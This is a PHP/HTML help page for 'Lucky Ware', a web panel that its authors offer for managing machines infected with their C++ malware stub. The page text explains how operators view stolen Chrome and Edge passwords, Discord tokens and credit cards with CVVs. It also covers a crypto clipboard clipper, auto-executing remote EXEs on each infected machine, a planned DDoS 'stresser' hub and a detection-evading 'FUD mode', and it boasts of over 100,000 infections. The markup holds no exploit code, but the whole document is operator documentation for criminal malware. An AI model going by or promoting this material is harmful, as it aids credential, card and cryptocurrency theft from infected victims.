<?php

$domainyess = $_SERVER['HTTP_HOST'];

?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../assets/css/custom.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="../assets/css/hover.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://dooovid.github.io/smoothcaret/demo/smoothCaret.min.js" defer></script>
    <link rel="stylesheet" href="../../assets/fontaw/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.11.5/css/jquery.dataTables.css">
    <script type="text/javascript" charset="utf8"
        src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.js"></script>
    <meta content="Luckyware" property="og:title" />
    <meta content="Luck is something you make and victory is something u take" property="og:description" />
    <meta content="https://<?php echo $domainyess; ?>" property="og:url" />
    <meta content="https://<?php echo $domainyess; ?>/icon.png" property="og:image" />
    <meta content="#e2ff85" data-react-helmet="true" name="theme-color" />
    <link rel="shortcut icon" href="https://<?php echo $domainyess; ?>/icon.png" />
    <title>Information</title>

    <style>
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #111111;
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 1;
            visibility: visible;
            /* Add visibility property */
            transition: all 1s ease;
            /* Longer transition and apply to all */
        }

        .loading-overlay.fade-out {
            opacity: 0;
            visibility: hidden;
            /* Hide element after fade */
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #333;
            border-radius: 50%;
            border-top-color: rgb(173, 25, 12);
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }



        /* Custom hover link color */
        .hover-link {
            color: #111111;
            transition: color 0.3s ease-in-out;
        }

        .hover-link:hover {
            color: #f54b42;
        }


        .current {
            background-color: #850000;
        }

        .btn3 {
            border: 1px solid #151515;
            /* Default border color */
            transition: box-shadow 0.5s ease-in-out, border-color 0.5s ease-in-out;
            /* Smooth transition */
        }

        .btn3:hover {
            box-shadow: 0 0 4px #B80000;
            /* Subtle dark red glow on hover */
            border-color: #B80000;
            /* Change border color to dark red */
        }
    </style>

</head>

<body class="dg">
    <div class="loading-overlay">
        <div class="loading-spinner"></div>
    </div>
    <div class="col-span-10 mx-5 mt-10"> <!-- CONTENT -->

        <div class="grid xl:grid-cols-6 gap-5 mt-5"> <!-- ANNOUNCEMENT + LOGS -->

            <div class="1 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 btn2">
                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                        class="fa-solid fa-globe mr-1 icon2"></i> Lucky Ware</h1>
                <hr class="mx-5 mt-2 border-stone-800">

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">General Information</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                        Lucky Ware is the third product in the Lucky Services Franchise, created and developed by
                        Hopesar. Designed for users with thousands of connections, it offers a web-based platform for
                        managing clients efficiently. Building on the experience from its predecessors, Luckycharm and
                        Luckyminer, Lucky Ware provides a refined and user-friendly experience. Its stubs are written in
                        pure C++, making them highly persistent once executed on a target machine. Luckyware web panel is not mobile friendly, it is recommended to use it on a PC or laptop. Preferably on a device with a 1080x1920 resolution. All features are experimental for now with no guarentee of function.
                    </h1>
                </div>


                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="1 block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">Trust</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">A common concern for new users is trust, how can
                        you securely manage countless connections through a web-based service? The answer lies in two
                        key factors. First, Lucky Services has established a trusted reputation over the years,
                        providing reliable connection management to thousands of users, with over 100,000 infections
                        handled.

                        The second and most critical factor is LSTA (Lucky Services Trust Algorithm), developed by
                        Hopesar. LSTA ensures the security of user data through a simple yet effective process: When you
                        register, your password is stored in the database. Upon creating your first build, your password
                        is linked to it. Once your first connection is received, its details are encrypted from
                        client-side with your password by your stub and then gets sent to the server to be stored in the
                        database. At this point, your password is deleted from the database. For subsequent logins, the
                        system verifies your password by checking if it can decrypt the stored data.

                        With LSTA, your connection data and logs remain secure and inaccessible to anyone, even if the
                        database were compromised. This algorithm has been successfully used in Luckycharm and
                        Luckyminer and is now a core feature of Lucky Ware, ensuring unparalleled security for your
                        connections.
                    </h1>
                </div>

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="1 block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">Support</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">If you have any additional questions or need
                        further assistance, feel free to reach out to @gh1s5 on Discord or @hopesar on Telegram. They
                        are available to help with any queries you may have.
                    </h1>
                </div>

            </div>


            <div class="1 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 btn2">
                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                        class="fa-solid fa-house mr-1 icon2"></i> Dashboard</h1>
                <hr class="mx-5 mt-2 border-stone-800">

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">General Information</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                        Lucky Ware dashboard is where you can view and interact with your connections, stay updated with
                        the latest announcements, and check system status.
                    </h1>
                </div>


                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="1 block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">Actions</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">On the Lucky Ware dashboard, you'll find three
                        buttons: Information, Execute, and Delete. The Information button displays additional details
                        not shown in the table. The Execute button allows actions like file execution or data download like Cookies (Cookie logging is still on beta and it may not log cookies on some devices.), Passwords, Tokens;
                        note that due to Lucky Ware's PHP-based system, execution may take up to 100 seconds. Lastly,
                        the Delete button removes the connection log permanently.
                    </h1>
                </div>

            </div>

            <div class="1 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 btn2">
                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                        class="fa-solid fa-hammer mr-1 icon2"></i> Builder</h1>
                <hr class="mx-5 mt-2 border-stone-800">

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">General Information</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                        The Lucky Ware builder allows you to create a Lucky Ware stub directly in your browser. The
                        build process typically takes 20-40 seconds and is fully web-based. Luckyware stubs require C++ Redistributable installed on a PC.
                    </h1>
                </div>


                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="1 block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">Settings</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">In the Lucky Ware builder's settings tab, the only
                        modifiable variable is the webhook, which must be a Discord webhook. Changing the webhook does
                        not affect your current build, as the webhook is server-based and notifications are sent from
                        the server. Once updated, logs from all your builds will be sent to the new webhook.
                    </h1>
                </div>

            </div>

            <div class="1 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 btn2">
                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                        class="fa-solid fa-key mr-1 icon2"></i> Passwords</h1>
                <hr class="mx-5 mt-2 border-stone-800">

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">General Information</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                        The Lucky Ware Passwords tab allows you to view passwords logged by Lucky Ware. You can browse
                        them in the data table and use the search functionality to filter results. The download feature
                        for bulk password exports is located on the Dashboard. Currently, Lucky Ware only logs Edge and
                        Chrome passwords.

                        Passwords are one-time logs. If a connection already has passwords stored in the database, no
                        new passwords will be logged, even if the user has additional ones. To log new passwords, you
                        must purge the existing passwords for that connection via the dashboard. This ensures that the
                        next time the connection goes online, any new passwords will be captured.
                    </h1>
                </div>


                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">Layout</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                        If you press on the url it will open the website in a new tab, if you press on the
                        username it will copy the username to your clipboard, and if you press on the password it will copy the password to your clipboard.
                    </h1>
                </div>
            </div>

            <div class="1 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 btn2">
                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                        class="fa-solid fa-hexagon-nodes mr-1 icon2"></i> Stresser Hub</h1>
                <hr class="mx-5 mt-2 border-stone-800">

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">General Information</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                        The Lucky Ware Stresser Hub is designed for performing Layer 4 and Layer 7 stressing actions
                        using your connections. However, this tab is currently under development and not yet available
                        for public use.
                    </h1>
                </div>
            </div>

            <div class="1 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 btn2">
                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                        class="fa-brands fa-discord mr-1 icon2"></i> Tokens</h1>
                <hr class="mx-5 mt-2 border-stone-800">

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">General Information</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                        The Lucky Ware Tokens tab displays Discord tokens logged from connections. Here, you can perform
                        actions such as downloading tokens and searching through them.
                    </h1>
                </div>

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="1 block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">Actions</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">On the Lucky Ware Tokens Tab, you'll find Discord
                        log options with four buttons: Download All Discord Tokens, Download Valid Discord Tokens,
                        Download Valid + Verified Tokens, and Purge Invalid Logs. These buttons are self-explanatory.

                        In the data table displaying your token logs, you'll see three action buttons. The first is the
                        Copy Token button, which will glow red if the token is invalid (checked every 3 hours by Lucky
                        Ware servers). the Delete button permanently removes the log.
                    </h1>
                </div>


            </div>


            <div class="1 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 btn2">
                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                        class="fa-solid fa-play mr-1 icon2"></i> Automations</h1>
                <hr class="mx-5 mt-2 border-stone-800">

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">General Information</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                        The Lucky Ware Automations tab is where you manage automations, which are EXE files set to
                        execute automatically every time a connection goes online.
                    </h1>
                </div>

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="1 block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">Adding Automations</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">To add automations, use the input box in the
                        Automations tab. Ensure your EXE file's link is accessible as a raw file (e.g.,
                        example.com/exefile.exe or test.net/exefile.bin) and hosted in a permanent location to prevent
                        link expiration. We recommend using GitHub or Catbox.moe for file hosting.
                    </h1>
                </div>

            </div>

            <div class="1 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 btn2">
                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                        class="fa-solid fa-clipboard mr-1 icon2"></i> Clipper</h1>
                <hr class="mx-5 mt-2 border-stone-800">

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">General Information</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                        The Lucky Ware Clipper tab is where you configure clipper addresses. The clipper replaces any
                        crypto address that connection copy with the one you specify in the settings. Since this
                        configuration is
                        server-based, once saved, it will apply to all builds universally.
                    </h1>
                </div>

            </div>


            <div class="1 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 btn2">
                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                        class="fa-solid fa-credit-card mr-1 icon2"></i> Cards</h1>
                <hr class="mx-5 mt-2 border-stone-800">

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">General Information</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                        The Lucky Ware Cards tab allows you to manage and view credit cards logged from connections. You
                        can purge all cards, download all logs, or simply browse and search through the card
                        information.
                    </h1>
                </div>

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="1 block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">HMCA Explained</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">HMCA, or Hopesar's Magnificent Card Algorithm, is
                        a unique algorithm developed by Hopesar in 2021. It has been exclusively implemented in Lucky
                        Services Franchise, including Lucky Ware. This algorithm enables Lucky Ware to log card details,
                        including Card Number, Expiry Date, and notably, the CVV—making Lucky Ware the first and only
                        service capable of logging CVVs. The data is captured as connections enter card information on
                        their browsers, apps, or anywhere on their devices. However, due to the nature of HMCA, rare
                        instances of invalid or "trash" card values (e.g., 42424242...) may occasionally appear in the
                        logs.
                    </h1>
                </div>

            </div>


            <div class="1 xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 btn2 mb-10">
                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                        class="fa-solid fa-gear mr-1 icon2"></i> Settings</h1>
                <hr class="mx-5 mt-2 border-stone-800">

                <div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">General Information</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                        The Lucky Ware Settings tab allows you to adjust account security options. You can add a
                        security webhook to receive notifications on your Discord webhook whenever a new login occurs.
                        Additionally, you can enable country lock, which restricts logins to the country from which you
                        are currently accessing your account.
                    </h1>
                </div>
				
				
				<div class="message dg mx-5 py-1 mt-5 rounded-lg btn3">
                    <div class="flex px-5 mt-3">
                        <div class="grid grid-cols-2">
                            <div class="block">
                                <h1 class="mt-1 ml-0 fntBold text-[#DCDBD1] tracking-wide">FUD Mode</h1>
                            </div>
                        </div>
                    </div>
                    <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                       Enablind this setting will make Luckyware leave 0 traces or warnings on the device its executed, however this will turn off all the remote feeatures and cookie logging, persistence.
                    </h1>
                </div>

            </div>


        </div>



    </div>
    </div> <!-- end -->

    <style>
        @keyframes topFlyIn {
            from {
                transform: translateY(-100%);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        /* Define the left-flying animation keyframes */
        @keyframes leftFlyIn {
            from {
                transform: translateX(-100%);
                opacity: 0;
            }

            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        /* Define the right-flying animation keyframes */
        @keyframes rightFlyIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }

            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        /* Define the bottom-flying animation keyframes */
        @keyframes bottomFlyIn {
            from {
                transform: translateY(100%);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        /* Apply the animation to elements with the respective class */
        .top-flying {
            animation-name: topFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateY(-100%);
        }

        .left-flying {
            animation-name: leftFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateX(-100%);
        }

        .right-flying {
            animation-name: rightFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateX(100%);
        }

        .bottom-flying {
            animation-name: bottomFlyIn;
            animation-duration: 0.8s;
            animation-timing-function: ease;
            animation-fill-mode: both;
            opacity: 0;
            transform: translateY(200%);
        }
    </style>

    <style>
        input::placeholder {
            color: #a8a29e;
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            // Wait for fonts and stylesheets
            Promise.all([
                document.fonts.ready,
                new Promise(resolve => {
                    // Check if all stylesheets are loaded
                    const styleSheets = Array.from(document.styleSheets);
                    if (styleSheets.every(sheet => sheet.loaded !== false)) {
                        resolve();
                    } else {
                        window.addEventListener('load', resolve);
                    }
                })
            ]).then(() => {
                const overlay = document.querySelector('.loading-overlay');

                // Add the fade-out class
                overlay.classList.add('fade-out');

                // Remove the element after the transition completes
                overlay.addEventListener('transitionend', function () {
                    overlay.parentNode.removeChild(overlay);
                }, {
                    once: true
                });
            });
        });

        // Preload custom fonts if you're using any
        const fonts = ['Kanit'];
        fonts.forEach(font => {
            new FontFace(font, `url(path/to/${font}.woff2)`)
                .load()
                .then(loadedFont => document.fonts.add(loadedFont));
        });
    </script>
</body>

</html>